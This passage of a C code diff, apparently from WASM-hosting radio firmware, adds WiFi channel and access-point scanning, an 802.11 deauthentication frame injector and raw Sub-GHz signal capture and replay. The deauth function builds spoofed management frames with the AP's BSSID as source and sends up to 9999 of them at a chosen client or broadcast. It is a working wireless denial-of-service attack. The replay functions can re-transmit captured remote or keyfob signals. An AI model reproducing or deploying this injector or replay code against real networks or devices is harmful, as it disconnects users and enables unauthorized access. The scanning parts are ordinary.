+                g_wifi_scan_ctx.rssi[ch] = entry->rssi;
+                g_wifi_scan_ctx.seen[ch] = 1;
+            }
+        }
+    } else if (event == NET_EVENT_WIFI_SCAN_DONE) {
+        k_sem_give(&g_wifi_scan_ctx.done);
+    }
+}
+
+int akira_native_wifi_scan_rssi(wasm_exec_env_t exec_env,
+                                 uint32_t buf_ptr, uint32_t buf_len)
+{
+    wasm_module_inst_t module_inst = wasm_runtime_get_module_inst(exec_env);
+    if (!module_inst) {
+        return -1;
+    }
 
     AKIRA_CHECK_CAP_OR_RETURN(exec_env, AKIRA_CAP_RF_TRANSCEIVE, -EPERM);
 
-#ifdef CONFIG_AKIRA_RF_FRAMEWORK
-    return akira_rf_set_power(dbm);
-#else
-    (void)dbm;
-    return -ENOSYS;
-#endif
+    if (buf_len < WIFI_SCAN_MAX_CHANNELS) {
+        return -EINVAL;
+    }
+
+    int8_t *dst = (int8_t *)wasm_runtime_addr_app_to_native(module_inst, buf_ptr);
+    if (!dst) {
+        return -EFAULT;
+    }
+
+    struct net_if *iface = net_if_get_wifi_sta();
+    if (!iface) {
+        LOG_ERR("wifi_scan_rssi: no STA interface");
+        return -ENODEV;
+    }
+
+    (void)memset(g_wifi_scan_ctx.rssi, RADIO_RSSI_UNAVAILABLE,
+                 sizeof(g_wifi_scan_ctx.rssi));
+    (void)memset(g_wifi_scan_ctx.seen, 0, sizeof(g_wifi_scan_ctx.seen));
+    k_sem_init(&g_wifi_scan_ctx.done, 0, 1);
+
+    if (!g_wifi_scan_cb_reg) {
+        net_mgmt_init_event_callback(&g_wifi_scan_cb,
+                                     wifi_scan_event_handler,
+                                     NET_EVENT_WIFI_SCAN_RESULT |
+                                     NET_EVENT_WIFI_SCAN_DONE);
+        net_mgmt_add_event_callback(&g_wifi_scan_cb);
+        g_wifi_scan_cb_reg = true;
+    }
+
+    LOG_INF("Starting WiFi scan for spectrum analysis");
+
+    int ret = net_mgmt(NET_REQUEST_WIFI_SCAN, iface, NULL, 0);
+    if (ret) {
+        LOG_ERR("WiFi scan request failed: %d", ret);
+        return ret;
+    }
+
+    ret = k_sem_take(&g_wifi_scan_ctx.done, K_MSEC(WIFI_SCAN_TIMEOUT_MS));
+    if (ret) {
+        LOG_WRN("WiFi scan timed out, returning partial results");
+    }
+
+    for (int i = 0; i < WIFI_SCAN_MAX_CHANNELS; i++) {
+        dst[i] = g_wifi_scan_ctx.rssi[i];
+    }
+
+    return WIFI_SCAN_MAX_CHANNELS;
+}
+
+/* ── AP scan (full wifi_scan_result records) ─────────────────────────── */
+
+#define WIFI_APS_MAX          64
+#define WIFI_AP_ENTRY_SIZE    48    /* sizeof(akira_wifi_ap_t) — must match SDK */
+#define WIFI_APS_TIMEOUT_MS   8000
+
+/*
+ * Wire struct — layout MUST stay in sync with akira_wifi_ap_t in akira_api.h.
+ * Natural alignment gives 48 bytes; verified with BUILD_ASSERT below.
+ */
+struct wifi_ap_wire {
+    uint8_t  ssid[33];      /* +0  null-terminated SSID */
+    uint8_t  bssid[6];      /* +33 BSSID (MAC) */
+    uint8_t  channel;       /* +39 2.4 GHz channel 1-14 */
+    int8_t   rssi;          /* +40 signal strength dBm */
+    uint8_t  security;      /* +41 0=open 1=WEP 2=WPA 3=WPA2 4=WPA3 5=ENT */
+    uint8_t  _pad[2];       /* +42 align last_seen_ms to 4-byte boundary */
+    uint32_t last_seen_ms;  /* +44 k_uptime_get_32() when last seen */
+};                          /* total 48 */
+BUILD_ASSERT(sizeof(struct wifi_ap_wire) == WIFI_AP_ENTRY_SIZE,
+             "wifi_ap_wire / akira_wifi_ap_t size mismatch");
+
+static struct wifi_ap_wire              g_aps_buf[WIFI_APS_MAX];
+static int                              g_aps_count;
+static struct k_sem                     g_aps_sem;
+static struct net_mgmt_event_callback   g_aps_cb;
+static bool                             g_aps_cb_reg;
+
+static uint8_t ap_map_security(enum wifi_security_type s)
+{
+    switch (s) {
+    case WIFI_SECURITY_TYPE_NONE:            return 0;
+    case WIFI_SECURITY_TYPE_WEP:             return 1;
+    case WIFI_SECURITY_TYPE_WPA_PSK:         return 2;
+    case WIFI_SECURITY_TYPE_PSK:
+    case WIFI_SECURITY_TYPE_PSK_SHA256:
+    case WIFI_SECURITY_TYPE_WPA_AUTO_PERSONAL:
+    case WIFI_SECURITY_TYPE_FT_PSK:          return 3; /* WPA2 */
+    case WIFI_SECURITY_TYPE_SAE:
+    case WIFI_SECURITY_TYPE_SAE_H2E:
+    case WIFI_SECURITY_TYPE_SAE_AUTO:
+    case WIFI_SECURITY_TYPE_FT_SAE:
+    case WIFI_SECURITY_TYPE_SAE_EXT_KEY:     return 4; /* WPA3 */
+    default:                                 return 5; /* Enterprise / unknown */
+    }
+}
+
+static void wifi_aps_event_handler(struct net_mgmt_event_callback *cb,
+                                    uint64_t event, struct net_if *iface)
+{
+    ARG_UNUSED(iface);
+
+    if (event == NET_EVENT_WIFI_SCAN_RESULT) {
+        if (g_aps_count >= WIFI_APS_MAX) return;
+        const struct wifi_scan_result *e =
+            (const struct wifi_scan_result *)cb->info;
+        if (!e) return;
+
+        /* Deduplicate by BSSID; update RSSI if this reading is stronger */
+        for (int i = 0; i < g_aps_count; i++) {
+            if (memcmp(g_aps_buf[i].bssid, e->mac, 6) == 0) {
+                if (e->rssi > g_aps_buf[i].rssi)
+                    g_aps_buf[i].rssi = e->rssi;
+                g_aps_buf[i].last_seen_ms = k_uptime_get_32();
+                return;
+            }
+        }
+
+        struct wifi_ap_wire *ap = &g_aps_buf[g_aps_count++];
+        uint8_t slen = e->ssid_length < 32u ? e->ssid_length : 32u;
+        memcpy(ap->ssid, e->ssid, slen);
+        ap->ssid[slen]   = '\0';
+        memcpy(ap->bssid, e->mac, 6);
+        ap->channel      = e->channel;
+        ap->rssi         = e->rssi;
+        ap->security     = ap_map_security(e->security);
+        ap->_pad[0]      = 0;
+        ap->_pad[1]      = 0;
+        ap->last_seen_ms = k_uptime_get_32();
+
+    } else if (event == NET_EVENT_WIFI_SCAN_DONE) {
+        k_sem_give(&g_aps_sem);
+    }
+}
+
+/*
+ * wifi_scan_aps(buf, buf_len) → int
+ *
+ * Runs a passive 802.11 scan and fills buf with akira_wifi_ap_t records.
+ * Blocks up to WIFI_APS_TIMEOUT_MS ms. Returns the number of APs found,
+ * or a negative errno on failure.
+ *
+ * Type string: "(*~)i" — WAMR validates ptr+len against WASM linear memory
+ * and converts the WASM offset to a native pointer before the call.
+ */
+int akira_native_wifi_scan_aps(wasm_exec_env_t exec_env,
+                                void *buf, uint32_t buf_len)
+{
+    AKIRA_CHECK_CAP_OR_RETURN(exec_env, AKIRA_CAP_RF_TRANSCEIVE, -EPERM);
+
+    if (!buf || buf_len < WIFI_AP_ENTRY_SIZE) return -EINVAL;
+
+    struct net_if *iface = net_if_get_wifi_sta();
+    if (!iface) {
+        LOG_ERR("wifi_scan_aps: no STA interface");
+        return -ENODEV;
+    }
+
+    uint32_t max_aps = buf_len / WIFI_AP_ENTRY_SIZE;
+    if (max_aps > WIFI_APS_MAX) max_aps = WIFI_APS_MAX;
+
+    memset(g_aps_buf, 0, sizeof(g_aps_buf));
+    g_aps_count = 0;
+    k_sem_init(&g_aps_sem, 0, 1);
+
+    if (!g_aps_cb_reg) {
+        net_mgmt_init_event_callback(&g_aps_cb, wifi_aps_event_handler,
+                                     NET_EVENT_WIFI_SCAN_RESULT |
+                                     NET_EVENT_WIFI_SCAN_DONE);
+        net_mgmt_add_event_callback(&g_aps_cb);
+        g_aps_cb_reg = true;
+    }
+
+    LOG_INF("wifi_scan_aps: starting passive scan");
+    int ret = net_mgmt(NET_REQUEST_WIFI_SCAN, iface, NULL, 0);
+    if (ret) {
+        LOG_ERR("wifi_scan_aps: scan request failed: %d", ret);
+        return ret;
+    }
+
+    ret = k_sem_take(&g_aps_sem, K_MSEC(WIFI_APS_TIMEOUT_MS));
+    if (ret) LOG_WRN("wifi_scan_aps: timeout, returning %d partial results",
+                     g_aps_count);
+
+    uint32_t n = (uint32_t)g_aps_count < max_aps
+                 ? (uint32_t)g_aps_count : max_aps;
+    memcpy(buf, g_aps_buf, n * WIFI_AP_ENTRY_SIZE);
+
+    LOG_INF("wifi_scan_aps: done — %d APs", g_aps_count);
+    return (int)n;
+}
+
+/* ── 802.11 deauthentication frame injector ─────────────────────────────── */
+
+/*
+ * 802.11 Management frame: Deauthentication (subtype 0xC).
+ * 24-byte fixed layout per IEEE 802.11-2020 §9.3.3.1.
+ */
+struct __attribute__((packed)) deauth_frame {
+    uint8_t  fc[2];      /* 0xC0 0x00 — Management, Deauthentication            */
+    uint8_t  dur[2];     /* 0x3A 0x01 — NAV duration (~314 µs)                  */
+    uint8_t  da[6];      /* Destination: target client or FF:FF:FF:FF:FF:FF      */
+    uint8_t  sa[6];      /* Source: spoofed as AP BSSID                          */
+    uint8_t  bssid[6];   /* BSS ID: AP BSSID                                     */
+    uint8_t  seq[2];     /* Sequence control (incremented per frame)             */
+    uint8_t  reason[2];  /* Reason code LE: 7 = Class-3 frame from non-assoc STA */
+};
+
+BUILD_ASSERT(sizeof(struct deauth_frame) == 24, "deauth_frame must be 24 bytes");
+
+#define DEAUTH_MAX_COUNT      9999
+#define DEAUTH_MIN_INTERVAL_MS  10
+
+/*
+ * wifi_deauth(bssid, client_mac, channel, count, interval_ms) → int
+ *
+ * Injects `count` 802.11 deauthentication frames directed at `client_mac`
+ * (or broadcast FF:FF:FF:FF:FF:FF) from `bssid` on `channel`.
+ * `interval_ms` is the inter-frame gap (min 10 ms).
+ *
+ * Returns the number of frames sent, or negative errno on error.
+ * Requires AKIRA_CAP_WIFI_INJECT.
+ *
+ * Type string: "(**iii)i"
+ */
+int akira_native_wifi_deauth(wasm_exec_env_t exec_env,
+                              void *bssid_ptr, void *client_ptr,
+                              int32_t channel, int32_t count, int32_t interval_ms)
+{
+    AKIRA_CHECK_CAP_OR_RETURN(exec_env, AKIRA_CAP_WIFI_INJECT, -EPERM);
+
+    if (!bssid_ptr || !client_ptr)          return -EINVAL;
+    if (channel < 1 || channel > 14)        return -EINVAL;
+    if (count   < 1 || count > DEAUTH_MAX_COUNT) return -EINVAL;
+    if (interval_ms < DEAUTH_MIN_INTERVAL_MS) interval_ms = DEAUTH_MIN_INTERVAL_MS;
+
+    wasm_module_inst_t inst = wasm_runtime_get_module_inst(exec_env);
+    WASM_ADDR_CHECK(inst, bssid_ptr,  6);
+    WASM_ADDR_CHECK(inst, client_ptr, 6);
+
+    const uint8_t *bssid  = (const uint8_t *)bssid_ptr;
+    const uint8_t *client = (const uint8_t *)client_ptr;
+
+    /* Set the radio to the target channel before injection */
+    esp_wifi_set_channel((uint8_t)channel, WIFI_SECOND_CHAN_NONE);
+
+    struct deauth_frame frame;
+    frame.fc[0]     = 0xC0; frame.fc[1]     = 0x00;
+    frame.dur[0]    = 0x3A; frame.dur[1]    = 0x01;
+    frame.reason[0] = 0x07; frame.reason[1] = 0x00; /* Reason 7 */
+    memcpy(frame.da,    client, 6);
+    memcpy(frame.sa,    bssid,  6);
+    memcpy(frame.bssid, bssid,  6);
+
+    int sent = 0;
+    for (int32_t i = 0; i < count; i++) {
+        /* Increment sequence number — low 12 bits of seq[0:1], LE */
+        uint16_t seq = (uint16_t)(i << 4);
+        frame.seq[0] = (uint8_t)(seq & 0xFF);
+        frame.seq[1] = (uint8_t)(seq >> 8);
+
+        esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, &frame, sizeof(frame), true);
+        if (err == ESP_OK) sent++;
+
+        if (i < count - 1) k_msleep(interval_ms);
+    }
+
+    LOG_INF("wifi_deauth: channel=%d count=%d sent=%d", channel, count, sent);
+    return sent;
+}
+
+#endif /* CONFIG_WIFI && CONFIG_AKIRA_RF_FRAMEWORK */
+
+/* ── Raw Sub-GHz OOK capture / replay ──────────────────────────────────── */
+
+#define RF_RAW_MAX_BYTES 8192u
+
+int akira_native_rf_raw_capture(wasm_exec_env_t exec_env,
+                                 uint32_t buf_wasm, uint32_t max_bytes,
+                                 uint32_t sample_rate_hz, int32_t timeout_ms)
+{
+    AKIRA_CHECK_CAP_OR_RETURN(exec_env, AKIRA_CAP_RF_TRANSCEIVE, -EPERM);
+
+    if (max_bytes == 0 || max_bytes > RF_RAW_MAX_BYTES) return -EINVAL;
+    if (timeout_ms <= 0) timeout_ms = 5000;
+
+    wasm_module_inst_t inst = wasm_runtime_get_module_inst(exec_env);
+    if (!inst) return -EFAULT;
+    uint8_t *buf = (uint8_t *)wasm_runtime_addr_app_to_native(inst, buf_wasm);
+    if (!buf || !wasm_runtime_validate_native_addr(inst, buf, max_bytes))
+        return -EFAULT;
+
+    return akira_rf_raw_capture(buf, max_bytes, sample_rate_hz,
+                                (uint32_t)timeout_ms);
+}
+
+int akira_native_rf_raw_replay(wasm_exec_env_t exec_env,
+                                uint32_t buf_wasm, uint32_t len,
+                                uint32_t sample_rate_hz, int32_t repeat)
+{
+    AKIRA_CHECK_CAP_OR_RETURN(exec_env, AKIRA_CAP_RF_TRANSCEIVE, -EPERM);
+
+    if (len == 0 || len > RF_RAW_MAX_BYTES) return -EINVAL;
+    if (repeat < 1) repeat = 1;
+
+    wasm_module_inst_t inst = wasm_runtime_get_module_inst(exec_env);
+    if (!inst) return -EFAULT;
+    const uint8_t *buf = (const uint8_t *)wasm_runtime_addr_app_to_native(inst, buf_wasm);
+    if (!buf || !wasm_runtime_validate_native_addr(inst, (void *)buf, len))
+        return -EFAULT;
+
+    return akira_rf_raw_replay(buf, len, sample_rate_hz, (uint32_t)repeat);
 }
 
 #endif /* CONFIG_AKIRA_WASM_RUNTIME */
+
+/* ===== WASM exports =====
+ * Registered with WAMR by the native API registry (akira_native_registry.h).
+ * Import names and signatures are WASM ABI: see docs/api-stability-policy.md. */
+#if defined(CONFIG_AKIRA_WASM_RUNTIME) && defined(CONFIG_AKIRA_WASM_API) && (defined(CONFIG_AKIRA_WASM_API) && defined(CONFIG_AKIRA_MODULE_RF) && defined(CONFIG_AKIRA_RADIO_MANAGER))
+#include <akira_native_registry.h>
+
+static const NativeSymbol akira_rf_natives[] = {
+    {"rf_set_frequency",       (void *)akira_native_rf_set_frequency,       "(i)i",    NULL},
+    {"rf_set_power",           (void *)akira_native_rf_set_power,           "(i)i",    NULL},
+    {"rf_get_rssi",            (void *)akira_native_rf_get_rssi,            "()i",     NULL},
+    {"rf_send",                (void *)akira_native_rf_send,                "(ii)i",   NULL},
+    {"rf_select",              (void *)akira_native_rf_select,              "(i)i",    NULL},
+    {"rf_recv_pop",            (void *)akira_native_rf_recv_pop,            "(iii)i",  NULL},
+    {"rf_receive",             (void *)akira_native_rf_receive,             "(iii)i",  NULL},
+    {"rf_set_modulation",      (void *)akira_native_rf_set_modulation,      "(i)i",    NULL},
+    {"rf_set_spreading_factor",(void *)akira_native_rf_set_spreading_factor,"(i)i",    NULL},
+    {"rf_set_bandwidth",       (void *)akira_native_rf_set_bandwidth,       "(i)i",    NULL},
+    {"rf_set_coding_rate",     (void *)akira_native_rf_set_coding_rate,     "(i)i",    NULL},
+    /* Raw OOK/ASK signal capture and replay (CC1101 / CC1121) */
+    {"rf_raw_capture",         (void *)akira_native_rf_raw_capture,         "(iiii)i",  NULL},
+    {"rf_raw_replay",          (void *)akira_native_rf_raw_replay,          "(iiii)i",  NULL},
+};
+
+AKIRA_NATIVE_API_DEFINE(akira_rf_api, "env", akira_rf_natives);
+#endif
+
+/* ===== WASM exports =====
+ * Registered with WAMR by the native API registry (akira_native_registry.h).
+ * Import names and signatures are WASM ABI: see docs/api-stability-policy.md. */
+#if defined(CONFIG_AKIRA_WASM_RUNTIME) && defined(CONFIG_AKIRA_WASM_API) && (defined(CONFIG_AKIRA_WASM_API) && defined(CONFIG_WIFI) && defined(CONFIG_AKIRA_RF_FRAMEWORK))
+#include <akira_native_registry.h>
+
+static const NativeSymbol akira_rf_wifi_natives[] = {
+    /* Passive 802.11 spectrum scan — per-channel max RSSI */
+    {"wifi_scan_rssi", (void *)akira_native_wifi_scan_rssi, "(ii)i",      NULL},
+    /* Passive 802.11 AP scan — full SSID/BSSID/channel/RSSI/security records */
+    {"wifi_scan_aps",  (void *)akira_native_wifi_scan_aps,  "(*~)i",      NULL},
+    /* 802.11 deauth frame injector — requires wifi.inject capability */
+    {"wifi_deauth",    (void *)akira_native_wifi_deauth,    "(**iii)i",   NULL},
+};
+
+AKIRA_NATIVE_API_DEFINE(akira_rf_wifi_api, "env", akira_rf_wifi_natives);
+#endif
